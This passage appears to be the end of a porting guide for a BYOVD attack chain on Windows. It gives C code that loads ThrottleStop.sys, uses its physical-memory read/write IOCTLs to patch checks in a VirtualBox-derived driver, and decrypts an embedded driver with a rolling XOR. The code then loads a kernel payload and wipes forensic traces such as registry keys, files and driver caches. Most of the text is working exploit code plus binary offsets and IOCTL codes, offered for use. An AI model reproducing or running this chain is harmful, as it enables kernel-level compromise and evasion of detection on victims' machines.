} OBJECT_ATTRIBUTES;

typedef NTSTATUS (NTAPI* PFN_NtCreateFile)(
    HANDLE* FileHandle,
    ACCESS_MASK DesiredAccess,
    OBJECT_ATTRIBUTES* ObjectAttributes,
    IO_STATUS_BLOCK* IoStatusBlock,
    LARGE_INTEGER* AllocationSize,
    ULONG FileAttributes,
    ULONG ShareAccess,
    ULONG CreateDisposition,
    ULONG CreateOptions,
    PVOID EaBuffer,
    ULONG EaLength
);

#define OBJ_CASE_INSENSITIVE        0x00000040L
#define FILE_NON_DIRECTORY_FILE     0x00000040
#define FILE_OPEN                   0x00000001

HANDLE OpenSUPDrvDevice(void) {
    HMODULE hNtdll = GetModuleHandleW(L"ntdll.dll");
    PFN_NtCreateFile NtCreateFile = (PFN_NtCreateFile)GetProcAddress(hNtdll, "NtCreateFile");
    PFN_RtlInitUnicodeString RtlInitUnicodeString =
        (PFN_RtlInitUnicodeString)GetProcAddress(hNtdll, "RtlInitUnicodeString");

    // Try primary device: \Device\Ld9BoxDrv
    UNICODE_STRING usDeviceName;
    RtlInitUnicodeString(&usDeviceName, L"\\Device\\Ld9BoxDrv");

    OBJECT_ATTRIBUTES objAttr;
    objAttr.Length = sizeof(OBJECT_ATTRIBUTES);
    objAttr.RootDirectory = NULL;
    objAttr.ObjectName = &usDeviceName;
    objAttr.Attributes = OBJ_CASE_INSENSITIVE;
    objAttr.SecurityDescriptor = NULL;
    objAttr.SecurityQualityOfService = NULL;

    IO_STATUS_BLOCK ioStatus = {0};
    HANDLE hDevice = NULL;

    NTSTATUS status = NtCreateFile(
        &hDevice,
        GENERIC_READ | GENERIC_WRITE,
        &objAttr,
        &ioStatus,
        NULL,
        FILE_ATTRIBUTE_NORMAL,
        FILE_SHARE_READ | FILE_SHARE_WRITE,
        FILE_OPEN,
        FILE_NON_DIRECTORY_FILE,
        NULL,
        0
    );

    if (status >= 0) {
        return hDevice;
    }

    // Try user variant: \Device\Ld9BoxDrvU
    RtlInitUnicodeString(&usDeviceName, L"\\Device\\Ld9BoxDrvU");
    status = NtCreateFile(&hDevice, GENERIC_READ | GENERIC_WRITE, &objAttr,
                          &ioStatus, NULL, FILE_ATTRIBUTE_NORMAL,
                          FILE_SHARE_READ | FILE_SHARE_WRITE, FILE_OPEN,
                          FILE_NON_DIRECTORY_FILE, NULL, 0);

    if (status >= 0) {
        return hDevice;
    }

    return NULL;
}
```

---

## Driver Encryption/Decryption

### Rolling XOR Algorithm

```c
// Constants
#define MARKER_MAGIC    0x4F4D4252  // "OMBR"
#define KEY_XOR_MASK    0xBABAB00E

static UINT32 RotateLeft(UINT32 value, int shift) {
    return (value << shift) | (value >> (32 - shift));
}

void DecryptInPlace(UINT8* pData, SIZE_T cbData, UINT32 dwKey) {
    UINT32 key = dwKey;

    for (SIZE_T i = 0; i < cbData; i++) {
        // Extract key byte based on position
        UINT8 keyByte = (UINT8)((key >> ((i % 4) * 8)) & 0xFF);

        // Save ciphertext byte before decryption
        UINT8 cipherByte = pData[i];

        // XOR to decrypt
        pData[i] = cipherByte ^ keyByte;

        // Evolve key based on ciphertext (NOT plaintext!)
        key = RotateLeft(key, 7) ^ cipherByte;
    }
}

BOOL DecryptWithHeader(const UINT8* pBlob, SIZE_T cbBlob, UINT8** ppDecrypted, SIZE_T* pcbDecrypted) {
    if (cbBlob < 8) {
        return FALSE;
    }

    // Validate magic marker
    UINT32 magic = *(UINT32*)&pBlob[0];
    if (magic != MARKER_MAGIC) {
        return FALSE;
    }

    // Extract and de-XOR key
    UINT32 xoredKey = *(UINT32*)&pBlob[4];
    UINT32 key = xoredKey ^ KEY_XOR_MASK;

    // Allocate output buffer
    SIZE_T cbData = cbBlob - 8;
    UINT8* decrypted = (UINT8*)malloc(cbData);
    if (!decrypted) {
        return FALSE;
    }

    // Decrypt
    memcpy(decrypted, &pBlob[8], cbData);
    DecryptInPlace(decrypted, cbData, key);

    *ppDecrypted = decrypted;
    *pcbDecrypted = cbData;
    return TRUE;
}
```

---

## Complete Attack Flow (C Pseudocode)

```c
int main(void) {
    HANDLE hThrottleStop = INVALID_HANDLE_VALUE;
    HANDLE hSUPDrv = INVALID_HANDLE_VALUE;
    SUPCOOKIE cookie = {0};
    UINT64 systemCr3 = 0;

    //-------------------------------------------------------------------------
    // PHASE 1: ThrottleStop.sys - Patch -618 Flags
    //-------------------------------------------------------------------------

    // 1. Deploy ThrottleStop.sys
    if (!DeployDriverViaNtLoadDriver(L"C:\\path\\to\\ThrottleStop.sys", L"ThrottleStop_Ombra")) {
        goto cleanup;
    }

    // 2. Open device (try dynamic name first)
    hThrottleStop = CreateFileW(L"\\\\.\\ThrottleStop_Ombra",
                                GENERIC_READ | GENERIC_WRITE,
                                FILE_SHARE_READ | FILE_SHARE_WRITE,
                                NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hThrottleStop == INVALID_HANDLE_VALUE) {
        // Fallback to static device name
        hThrottleStop = CreateFileW(L"\\\\.\\ThrottleStop",
                                    GENERIC_READ | GENERIC_WRITE,
                                    FILE_SHARE_READ | FILE_SHARE_WRITE,
                                    NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
    }
    if (hThrottleStop == INVALID_HANDLE_VALUE) {
        goto cleanup;
    }

    // 3. Get SYSTEM CR3
    systemCr3 = GetSystemCr3(hThrottleStop);
    if (systemCr3 == 0) {
        goto cleanup;
    }

    // 4. Get Ld9BoxSup.sys base address
    UINT64 ld9BoxBase = GetDriverBaseAddress(L"Ld9BoxSup.sys");
    if (ld9BoxBase == 0) {
        goto cleanup;
    }

    // 5. Patch -618 flags
    if (!Patch618Flags(hThrottleStop, systemCr3, ld9BoxBase)) {
        goto cleanup;
    }

    // 6. Cleanup ThrottleStop
    CloseHandle(hThrottleStop);
    hThrottleStop = INVALID_HANDLE_VALUE;
    StopAndDeleteService(L"ThrottleStop_Ombra");
    SecureDeleteFile(L"C:\\path\\to\\ThrottleStop.sys");

    //-------------------------------------------------------------------------
    // PHASE 2: Ld9BoxSup.sys - Load Hypervisor
    //-------------------------------------------------------------------------

    // 7. Extract and deploy Ld9BoxSup.sys
    UINT8* pEncrypted = NULL;
    SIZE_T cbEncrypted = 0;
    if (!ExtractResource(IDR_LD9BOXSUP_ENCRYPTED, &pEncrypted, &cbEncrypted)) {
        goto cleanup;
    }

    UINT8* pDecrypted = NULL;
    SIZE_T cbDecrypted = 0;
    if (!DecryptWithHeader(pEncrypted, cbEncrypted, &pDecrypted, &cbDecrypted)) {
        goto cleanup;
    }

    WCHAR wszTempPath[MAX_PATH];
    GetTempPathW(MAX_PATH, wszTempPath);
    wcscat_s(wszTempPath, MAX_PATH, L"Ld9BoxSup.sys");

    WriteFile(wszTempPath, pDecrypted, cbDecrypted);

    if (!DeployDriverViaNtLoadDriver(wszTempPath, L"Ld9BoxSup")) {
        goto cleanup;
    }

    // 8. Open SUPDrv device
    hSUPDrv = OpenSUPDrvDevice();
    if (hSUPDrv == NULL) {
        goto cleanup;
    }

    // 9. Cookie handshake
    if (!SUPDrv_ProbeVersionAndAcquireCookie(hSUPDrv, &cookie)) {
        goto cleanup;
    }

    // 10. Allocate kernel memory
    UINT64 pvKernelBase = 0;
    if (!SUPDrv_AllocateKernelMemory(hSUPDrv, &cookie, payloadSize, &pvKernelBase)) {
        // If this fails with -618, ThrottleStop patch didn't work!
        goto cleanup;
    }

    // 11. Load and execute payload
    if (!SUPDrv_LoadAndExecute(hSUPDrv, &cookie, pvKernelBase, payloadBytes, payloadSize, 0)) {
        goto cleanup;
    }

    // SUCCESS! pfnModuleInit has been called - hypervisor is active!

    // 12. Cleanup artifacts while driver remains in memory
    DeleteRegistryKey(L"Ld9BoxSup");
    SecureDeleteFile(wszTempPath);

cleanup:
    if (hThrottleStop != INVALID_HANDLE_VALUE) {
        CloseHandle(hThrottleStop);
    }
    if (hSUPDrv != INVALID_HANDLE_VALUE) {
        CloseHandle(hSUPDrv);
    }

    return 0;
}
```

---

## Testing Checklist

### ThrottleStop Primitives
- [ ] Service creation/deletion
- [ ] Device open (dynamic and static names)
- [ ] ReadPhysical1/2/4/8 - verify output buffer size determines read size
- [ ] WritePhysical1/2/4/8 - verify input buffer size determines write size
- [ ] GetSystemCr3 - verify "System" string match at offset 0x5a8
- [ ] TranslateVirtToPhys - test with known kernel addresses
- [ ] Patch618Flags - verify both flags set to 1 after write

### SUPDrv Cookie Handshake
- [ ] Device open via NtCreateFile (not CreateFileW!)
- [ ] Try all 4 known versions in order
- [ ] Verify cookie magic: "The Magic Word!"
- [ ] Verify initial cookie: 0x69726F74 ("tori")
- [ ] Verify cbIn=48, cbOut=56 exact match
- [ ] Parse session cookie and session pointer from response

### SUPDrv LDR_OPEN
- [ ] Verify cbImageWithTabs = cbImageBits + 1 (strictly greater!)
- [ ] Verify cbIn=328, cbOut=40 exact match
- [ ] Check returned pvImageBase is kernel address (>= 0xFFFF800000000000)
- [ ] Test with -618 flags NOT patched (should fail)
- [ ] Test with -618 flags patched (should succeed)

### SUPDrv LDR_LOAD
- [ ] Verify pvImageBase matches LDR_OPEN result
- [ ] Verify cbImageWithTabs matches LDR_OPEN
- [ ] Set eEPType = SUPLDRLOADEP_SERVICE (2)
- [ ] Set pfnModuleInit = pvImageBase + entryOffset
- [ ] Verify pfnModuleInit gets called
- [ ] Check rc from pfnModuleInit (0 = success)

### Driver Encryption
- [ ] DecryptWithHeader validates magic 0x4F4D4252
- [ ] XOR key extracted via key ^ 0xBABAB00E
- [ ] Rolling XOR: key = rotl(key, 7) ^ cipherByte
- [ ] Decrypted PE has "MZ" signature

### Artifact Cleanup
- [ ] Registry keys deleted after driver load
- [ ] Driver files secure-deleted (zero-overwrite)
- [ ] Services deleted from SCM
- [ ] MmUnloadedDrivers cleared (optional, if hypervisor provides primitive)
- [ ] PiDDBCacheTable cleared (optional)

---

## C Conversion Notes

### Replace C++ Standard Library

| C++ | C Alternative |
|-----|---------------|
| `std::vector<uint8_t>` | `uint8_t* + malloc/free` |
| `std::string` | `char*` + manual allocation |
| `std::wstring` | `WCHAR*` + manual allocation |
| `memcpy(vec.data(), ...)` | Direct `memcpy(ptr, ...)` |
| `vec.size()` | Track size in separate variable |
| `.empty()` | `ptr == NULL || size == 0` |

### Error Handling

```c
// C++ exceptions:
// try { ... } catch (exception& e) { ... }

// C equivalent:
BOOL success = FALSE;
char lastError[256] = {0};

if (!Operation()) {
    snprintf(lastError, sizeof(lastError), "Operation failed: %lu", GetLastError());
    goto cleanup;
}

success = TRUE;

cleanup:
    // Free resources
    return success;
```

### DeviceIoControl Wrappers

```c
// Wrapper for type safety
BOOL DeviceIoControl_SUPDrv(
    HANDLE hDevice,
    DWORD dwIoControlCode,
    void* pInBuffer,
    DWORD nInBufferSize,
    void* pOutBuffer,
    DWORD nOutBufferSize
) {
    DWORD dwReturned = 0;
    return DeviceIoControl(
        hDevice,
        dwIoControlCode,
        pInBuffer,
        nInBufferSize,
        pOutBuffer,
        nOutBufferSize,
        &dwReturned,
        NULL
    );
}
```

### Structure Packing

```c
// CRITICAL: Use #pragma pack(1) for all SUPDrv structures
// VirtualBox driver compiled without pack(1), but uses natural alignment
// Match the exact layout from binary analysis

#pragma pack(push, 1)
typedef struct _SUPREQHDR {
    UINT32 u32Cookie;
    UINT32 u32SessionCookie;
    UINT32 cbIn;
    UINT32 cbOut;
    UINT32 fFlags;
    INT32 rc;
} SUPREQHDR;
#pragma pack(pop)

// Verify at compile time
_Static_assert(sizeof(SUPREQHDR) == 24, "SUPREQHDR must be 24 bytes");
```

---

## Binary Offsets Reference (Dec 2025)

### Ld9BoxSup.sys (376,176 bytes)

| Offset | Value | Purpose |
|--------|-------|---------|
| `0x36d58` | `"The Magic Word!"` | Cookie magic string |
| `0x4a1a0` | `ntoskrnl_flag` | Byte we patch (0→1) |
| `0x4a210` | `hal_flag` | Byte we patch (0→1) |
| `0x3a80` | IOCTL dispatch | Cookie code validation |
| `0x140008f2d` | `cmp edx, 0x69726f74` | Initial cookie check ("tori") |
| `0x140004787` | `cmp r8d, 0x320000` | Version validation |
| `0x1400074e4` | `cmp cbImageBits, cbImageWithTabs; jb` | Size validation (must be <) |
| `0x14001d584` | -618 check | `test al,al; je error` (ntoskrnl flag) |

### ThrottleStop.sys

| IOCTL | Purpose | Input | Output |
|-------|---------|-------|--------|
| `0x80006498` | Read physical memory | 8 bytes (PA) | 1/2/4/8 bytes |
| `0x8000649C` | Write physical memory | 9/10/12/16 bytes | NULL |

### Windows 10/11 EPROCESS Offsets

| Offset | Field | Size |
|--------|-------|------|
| `0x28` | DirectoryTableBase (CR3) | 8 bytes |
| `0x5a8` | ImageFileName | 15 bytes |

String match: `"System\0"` = `0x00006d6574737953` (little-endian, first 6 bytes)

---

**End of Document**

This guide contains all information needed to port the BYOVD attack chain from C++ to pure C + Assembly. All magic values, offsets, and structures are verified from binary analysis as of December 2025.
